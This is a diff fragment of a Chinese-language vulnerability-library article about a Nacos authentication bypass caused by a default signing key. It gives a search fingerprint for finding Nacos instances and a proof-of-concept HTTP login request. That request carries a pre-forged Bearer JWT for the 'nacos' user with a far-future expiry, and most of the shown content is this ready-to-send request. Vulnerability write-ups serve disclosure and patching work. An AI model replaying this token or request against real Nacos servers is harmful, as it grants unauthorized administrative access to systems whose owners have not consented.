@@ -2,7 +2,7 @@
 source: "gelusus/wxvl 公众号漏洞文库"
 ---
 
-#  Nacos默认key导致权限绕过登陆漏洞 附POC  
+#  Nacos默认key导致权限绕过登陆漏洞 附POC  
 安服仔
                     安服仔  北风漏洞复现文库   2026-02-04 03:03  
   
@@ -66,11 +66,11 @@ app="Nacos"
 POC  
   
 ```
-POST /nacos/v1/auth/users/login HTTP/1.1
-Host: 127.0.0.1
-Content-Length: 28
+POST /nacos/v1/auth/users/login HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 28
 Accept: application/json, text/plain, */*
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
 Content-Type: application/x-www-form-urlencoded
 Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA3MDk1MzY0M30.XPfd1WnNHqQdu5-D734ishsizYCEbsQG7mVwdm4MyWg
 Accept-Encoding: gzip, deflate
